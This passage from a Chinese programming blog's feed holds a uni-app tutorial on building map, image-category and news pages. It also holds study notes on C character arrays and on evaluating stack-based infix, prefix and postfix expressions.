class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;map <span class="hljs-keyword">class</span>=&quot;<span class="hljs-symbol">map</span>&quot; :<span class="hljs-symbol">latitude</span>=&quot;<span class="hljs-symbol">latitude</span>&quot; :<span class="hljs-symbol">longitude</span>=&quot;<span class="hljs-symbol">longitude</span>&quot; :<span class="hljs-symbol">markers</span>=&quot;<span class="hljs-symbol">markers</span>&quot;&gt;&lt;/<span class="hljs-symbol">map</span>&gt;<br><br>//<span class="hljs-symbol">markers</span><br><span class="hljs-symbol">markers: </span>[<br>    &#123;<br>    <span class="hljs-comment">//id必写</span><br>        id:<span class="hljs-number">1</span>,<br>        latitude: <span class="hljs-number">30.832711</span>,<br>        longitude: <span class="hljs-number">104.190908</span>,<br>        iconPath: <span class="hljs-string">&quot;../../static/icon/logo.png&quot;</span>,<br>        <span class="hljs-comment">//设置透明度</span><br>        alpha: <span class="hljs-number">0.7</span><br>    &#125;<br>],<br></code></pre></td></tr></table></figure><p>然后拨打电话可以调用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">phone</span><span class="hljs-params">()</span></span>&#123;<br>uni<span class="hljs-selector-class">.makePhoneCall</span>(&#123;<br>phoneNumber:<span class="hljs-string">&quot;110-112-113&quot;</span><br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-pics页面"><a href="#9-pics页面" class="headerlink" title="9.pics页面"></a>9.pics页面</h3><p>这个页面需要在左侧设置一个滚动条，右侧是展示的图片等信息</p><h4 id="9-1-左侧"><a href="#9-1-左侧" class="headerlink" title="9.1 左侧"></a>9.1 左侧</h4><p>作为左侧的滚动条我们可以设置为：</p><p>需要注意这里从内到位的高度都需要设置成100%</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&lt;<span class="hljs-built_in">view</span> class=<span class="hljs-string">&quot;pics&quot;</span>&gt;<br>&lt;scroll-<span class="hljs-built_in">view</span> class=<span class="hljs-string">&quot;left&quot;</span> scroll-y=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span>&gt;家具生活&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;/scroll-<span class="hljs-built_in">view</span>&gt;<br>&lt;/<span class="hljs-built_in">view</span>&gt;<br><br>//样式<br>page&#123;<br><span class="hljs-built_in">height</span>: <span class="hljs-number">100</span><span class="hljs-symbol">%</span>;<br>&#125;<br>.pics&#123;<br><span class="hljs-built_in">height</span>: <span class="hljs-number">100</span><span class="hljs-symbol">%</span>;<br>.left&#123;<br><span class="hljs-built_in">width</span>: 100px;<br><span class="hljs-built_in">height</span>: <span class="hljs-number">100</span><span class="hljs-symbol">%</span>;<br><span class="hljs-built_in">border</span>: solid 1px #eee;<br><span class="hljs-built_in">view</span>&#123;<br><span class="hljs-built_in">height</span>: 60px;<br><span class="hljs-built_in">width</span>: <span class="hljs-number">100</span><span class="hljs-symbol">%</span>;<br>line-<span class="hljs-built_in">height</span>: 60px;<br>text-align: <span class="hljs-built_in">center</span>;<br><span class="hljs-built_in">font</span>-size: 30rpx;<br><span class="hljs-built_in">border</span>-top: solid 1px #eee;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是设置左侧数据渲染和数据展示</p><p>因为接口有问题，所以这里的数据我写死了</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">cates:</span>[<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;家居生活&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">1</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;摄影设计&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">2</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;装饰&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">3</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;服饰&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">4</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;装修&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">5</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;电气&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">6</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;管道&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">7</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;户型设计&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">8</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;医药&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">9</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;书籍&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">10</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;管道&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">11</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;户型设计&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">12</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;医药&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">13</span>,<br>&#125;,<br>&#123;<br><span class="hljs-symbol">title:</span><span class="hljs-string">&quot;书籍&quot;</span>,<br><span class="hljs-symbol">id:</span><span class="hljs-number">14</span>,<br>&#125;<br>],<br><span class="hljs-symbol">isActive:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cos">&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;pics&quot;</span>&gt;<br>&lt;scroll-<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;left&quot;</span> scroll-y=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>&lt;<span class="hljs-keyword">view</span>  :<span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;isActive===item.id?&#x27;active&#x27; : &#x27;&#x27;&quot;</span> v-<span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;(item,index) in cates&quot;</span> :key=<span class="hljs-string">&quot;item.id&quot;</span> @click=<span class="hljs-string">&quot;changeItem(item.id)&quot;</span>&gt;&#123;&#123;item.title&#125;&#125;&lt;/<span class="hljs-keyword">view</span>&gt;<br>&lt;/scroll-<span class="hljs-keyword">view</span>&gt;<br>&lt;/<span class="hljs-keyword">view</span>&gt;<br></code></pre></td></tr></table></figure><p>这里得到的数据由cates遍历得到，这里我开始犯了一个错误，将三元表达式写成了这个样子</p><p><code>&quot;isActive===id?&#39;active&#39; : &#39;&#39;&quot;</code>，我们需要知道这个时候id是item中的属性，能这样写的情况取决于v-for</p><p> <code>v-for=&quot;(item,index) in cates&quot; :key=&quot;id&quot; </code>，如果这样子写，那么就可以将三元表达式写成<code>&quot;isActive===index?&#39;active&#39; : &#39;&#39;&quot;</code></p><p>对于v-for来说，我们得到的数据只有in前面的哪几个</p><h4 id="9-2-右侧"><a href="#9-2-右侧" class="headerlink" title="9.2 右侧"></a>9.2 右侧</h4><p>右侧的数据每个item的数据渲染部分</p><p>依然使用<code>scroll-view</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">scroll-view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">scroll-y</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span>  <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;item in details&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;item.id&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../static/icon/logo.png&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">item.title</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">item.zhaiyao</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">scroll-view</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>主要是样式设计，需要开启一个flex布局</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-class">.pics</span>&#123;<br><span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;<br><span class="hljs-attribute">display</span>: flex;<br><span class="hljs-selector-class">.left</span>&#123;<br>---<br>&#125;<br><span class="hljs-selector-class">.right</span>&#123;<br><span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;<br><span class="hljs-attribute">width</span>: <span class="hljs-number">520</span>rpx;<br><span class="hljs-comment">//设置间隔距离</span><br><span class="hljs-attribute">margin</span>: <span class="hljs-number">10</span>rpx auto;<br><span class="hljs-selector-class">.item</span>&#123;<br><span class="hljs-selector-tag">img</span>&#123;<br><span class="hljs-attribute">height</span>: <span class="hljs-number">520</span>rpx;<br>weight: <span class="hljs-number">520</span>rpx;<br><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;<br>&#125;<br>text&#123;<br><span class="hljs-attribute">font-size</span>: <span class="hljs-number">30</span>rpx;<br><span class="hljs-attribute">line-height</span>: <span class="hljs-number">60</span>rpx;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现预览图片</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//预览图片</span><br><span class="hljs-function"><span class="hljs-title">previewImg</span><span class="hljs-params">(current_img)</span></span>&#123;<br><span class="hljs-comment">//提取details数组中的img_url属性</span><br>const urls = this<span class="hljs-selector-class">.details</span><span class="hljs-selector-class">.map</span>(item =&gt; &#123;<br>return item<span class="hljs-selector-class">.img_url</span><br>&#125;)<br>uni<span class="hljs-selector-class">.previewImage</span>(&#123;<br>urls,<br>current: current_img,<br>indicator: <span class="hljs-string">&quot;default&quot;</span>,<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-资讯"><a href="#3-资讯" class="headerlink" title="3.资讯"></a>3.资讯</h2><p>对于资讯页面我们依然先搭建结构</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&lt;<span class="hljs-built_in">view</span> class=<span class="hljs-string">&quot;news&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">view</span> class=<span class="hljs-string">&quot;news_item&quot;</span> v-<span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;item in news&quot;</span> :<span class="hljs-built_in">key</span>=<span class="hljs-string">&quot;item.id&quot;</span> &gt;<br>&lt;<span class="hljs-built_in">image</span> src=<span class="hljs-string">&quot;../../static/icon/cart-active.png3&quot;</span>&gt;&lt;/<span class="hljs-built_in">image</span>&gt;<br>&lt;<span class="hljs-built_in">view</span> class=<span class="hljs-string">&quot;right&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">view</span> class=<span class="hljs-string">&quot;title&quot;</span>&gt;&#123;&#123;item.<span class="hljs-built_in">title</span>&#125;&#125;&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;<span class="hljs-built_in">view</span> class=<span class="hljs-string">&quot;info&quot;</span>&gt;<br>&lt;text&gt;发表时间：&#123;&#123;item.add_time&#125;&#125;&lt;/text&gt;<br>&lt;text&gt;浏览：&#123;&#123;item.click&#125;&#125;&lt;/text&gt;<br>&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;/<span class="hljs-built_in">view</span>&gt;<br>&lt;/<span class="hljs-built_in">view</span>&gt;<br><br>//样式<br>.news&#123;<br>.news_item&#123;<br>//开启弹性<br><span class="hljs-built_in">display</span>: flex;<br>padding: 10rpx 20rpx;<br><span class="hljs-built_in">border</span>-bottom: 1px solid $uni-<span class="hljs-built_in">color</span>-shop;<br><span class="hljs-built_in">image</span>&#123;<br><span class="hljs-built_in">min</span>-<span class="hljs-built_in">width</span>: 200rpx;<br><span class="hljs-built_in">max</span>-<span class="hljs-built_in">width</span>: 200rpx;<br><span class="hljs-built_in">height</span>: 150rpx;<br>&#125;<br>.right&#123;<br><span class="hljs-built_in">display</span>: flex;<br>margin-left: 15rpx;<br>//切换方式为竖轴<br>flex-direction: column;<br>//两边对齐<br>justify-<span class="hljs-built_in">content</span>: <span class="hljs-built_in">space</span>-between;<br>.<span class="hljs-built_in">title</span>&#123;<br><span class="hljs-built_in">font</span>-size: 30rpx;<br>&#125;<br>.info&#123;<br><span class="hljs-built_in">font</span>-size: 24rpx;<br>text:nth-child(<span class="hljs-number">2</span>)&#123;<br>margin-left: 30rpx;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是熟悉的接口和获取参数，然后遍历list得到数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br><span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;<br><span class="hljs-keyword">return</span> &#123;<br><span class="hljs-attr">news</span>:[],<br>&#125;<br>&#125;,<br><span class="hljs-function"><span class="hljs-title">onLoad</span>(<span class="hljs-params"></span>)</span> &#123;<br><span class="hljs-built_in">this</span>.getNews();<br>&#125;,<br><span class="hljs-attr">methods</span>: &#123;<br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-title">getNews</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.$myreq(&#123;<br><span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/api/getnewslist&quot;</span>,<br>&#125;)<br><br><span class="hljs-built_in">this</span>.news = res.data.message<br><span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.news)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当我们点击某一条资讯的时候可以进入资讯的详情页</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;view <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;news_item&quot;</span> @<span class="hljs-attribute">click</span>=<span class="hljs-string">&quot;goDetails(item.id)&quot;</span> <span class="hljs-attribute">v-for</span>=<span class="hljs-string">&quot;item in news&quot;</span> :<span class="hljs-attribute">key</span>=<span class="hljs-string">&quot;item.id&quot;</span> &gt;<br></code></pre></td></tr></table></figure><p>传入id作为每个资讯的标识</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe">goDetails(id)&#123;<br>uni.navigateTo(&#123;<br>url: <span class="hljs-type"></span>`/pages/<span class="hljs-keyword">new</span><span class="hljs-type">s</span>-detail/<span class="hljs-keyword">new</span><span class="hljs-type">s</span>-detail?id=$&#123;id&#125;`<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们跳转至<code>news-detail</code>页面</p><p>进入之后第一件事情当然是发请求</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">async getNewsDetails()&#123;<br><span class="hljs-keyword">const</span> res = await <span class="hljs-keyword">this</span>.$myreq(&#123;<br>url: `/api/getnew/$&#123;<span class="hljs-keyword">this</span>.id&#125;`<br>&#125;)<br><br><span class="hljs-keyword">this</span>.details = res.<span class="hljs-keyword">data</span>.message[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">this</span>.details.add_time = <span class="hljs-keyword">this</span>.formatDate(<span class="hljs-keyword">this</span>.details.add_time)<br>&#125;,<br></code></pre></td></tr></table></figure><p>与众不同的是这个时候返回的内容数据是html</p><p>所以我们展示的时候就不能使用插值语法，<strong>使用<code>v-html</code></strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;view <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-attribute">v-html</span>=<span class="hljs-string">&quot;details.content&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>或者使用<code>&lt;rich-text :nodes=&quot;参数&quot;&gt;</code>富文本也可以解决</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span>内容：<br><span class="hljs-comment">&lt;!-- 引入富文本解析html --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rich-text</span> <span class="hljs-attr">:nodes</span>=<span class="hljs-string">&quot;Dinfo.content&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">rich-text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="4-获取商品详情"><a href="#4-获取商品详情" class="headerlink" title="4.获取商品详情"></a>4.获取商品详情</h2><p>点击goodList组件中的图片可以进行跳转</p><p>需要用到子组件向父组件传值，使用emit绑定自定义事件，并通过第二个参数进行传值</p><p>因为goodList在index首页和goods页面都有用到，所以这两个父页面都需要绑定对应的自定义事件</p><p>而且他们需要获得goodList中的<code>item.id</code></p><p>然后在两个父页面中使用navigate跳转到详情页面，并把数据<code>id</code>通过OnLoad中的options传入</p><p>详情页面拿到<code>id</code>后向服务器端发送请求，获取的数据用于轮播图，基本信息展示</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>uni-app</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>some exercise</title>
    <link href="/2022/09/29/some%20exercise/"/>
    <url>/2022/09/29/some%20exercise/</url>
    
    <content type="html"><![CDATA[<h2 id="task-数组"><a href="#task-数组" class="headerlink" title="task-数组"></a>task-数组</h2><h3 id="ex1"><a href="#ex1" class="headerlink" title="ex1."></a>ex1.</h3><pre><code class="hljs">char a[2][3] = &#123;&#123;'a', 'b', 'c'&#125;, &#123;'1', '\0', '2'&#125;&#125;;printf(&quot;%s&quot;, a[0]);</code></pre><p>试问打印的结果是什么：</p><p>首先我们要知道<code>%s</code>是字符串，那么a[0]应该是要输出全部数据，也就是<code>a,b,c,1,\0,2</code></p><p>但是<code>\0</code>是转义字符是字符串的结束标志，所以我们最终的输出结果是<code>a,b,c,1</code></p><p>或者会问：</p><p>在C语言中，顺序存储长度为3的字符串，需要占用（）个字节。</p><p>首先明确 一个char是一个字节，最后字符串会有一个<code>\0</code>作为结束，所以是4个字节</p><h3 id="ex2"><a href="#ex2" class="headerlink" title="ex2."></a>ex2.</h3><pre><code class="hljs">int a[] = &#123;1, 2, 3, 4, 5, 6, 7, 8&#125;;char s = &#39;a&#39;, e, i;</code></pre><p>我们如果想得到a[4]=&gt;5怎么办</p><p>首先想到的是ascll码</p><p>使用a[‘e’-‘s’]，而’a’在这个题中是<code>char s</code></p><p>所以可以写成<code>a[&#39;e&#39;-s]</code></p><h3 id="ex3"><a href="#ex3" class="headerlink" title="ex3."></a>ex3.</h3><p>数组A=array[1..100，1..100]以行序为主序存储，设每个数据元素占2个存储单元，基地址为10，则LOC[5，5]应为。</p><p>这个可以代表二维数组计数从1 开始，也就是4行4列的数据</p><p><code>10+[4*100+4]*2</code>为818</p><h2 id="task-stack"><a href="#task-stack" class="headerlink" title="task-stack"></a>task-stack</h2><h3 id="ex1-中前后缀表达式"><a href="#ex1-中前后缀表达式" class="headerlink" title="ex1.中前后缀表达式"></a>ex1.中前后缀表达式</h3><p>中缀表达式：最符合人认识的表达式，也就是我们常写的<code>1+2*(3-4)</code></p><p>中缀表达式的计算是：例如：<code>(10+20/2*3)/2+8</code></p><p> 一个符号栈operatorStack，一个数字栈numberStack，刚开始栈都为空。</p><p>ope:                num:            </p><p>数字和符号分别入栈，如果<strong>入栈符号的优先级小于等于栈顶符号</strong>，则立即计算两个数字</p><p>ope:  ( ，+ ，/      num: 10 20 2</p><p>然后 * 入栈，因为 * 和 / 的优先级一样，进行20/2的计算得到10，再入栈</p><p>ope:( +                 num: 10 10</p><p>最后继续得到结果</p><p>前缀表达式：符号放在前面的表达式</p><p>运算：从右到左扫码表达式，扫描到符号的时候计算两个栈顶数字然后结果入栈</p><p>中缀=&gt;前缀 转换：</p><pre><code class="hljs"> - 初始化两个栈，符号栈s1、存放中间结果栈s2 - 从右至左扫描中缀表达式 - 遇到操作数，将其压入栈s2 - 遇到操作运算符，则需要比较其与s1栈顶操作符的优先级             1.若s1为空，或者栈顶运算符为右括号)，则直接入栈             2.优先级高于栈顶运算符，也直接入栈             3.否则，将s1栈顶运算符弹出压入s2，再转到步骤1进行判断 - 遇到括号：            1.如果遇到右括号，直接压入栈            2.如果遇到左括号，则依次弹出s1栈顶运算符，压入s2，直到遇到右括号为止，并将这一对括号丢弃- 重复2-5，直至表达式左边- 将s1中剩余运算符依次弹出并压入s2- 依次弹出s2的元素，即为中缀表达式</code></pre><p>后缀表达式：符号在后面的表达式</p><p>运算和前缀一样：从左至右扫描表达式，遇到数字时，将数字压入堆栈，遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算（<strong>次顶元素 op 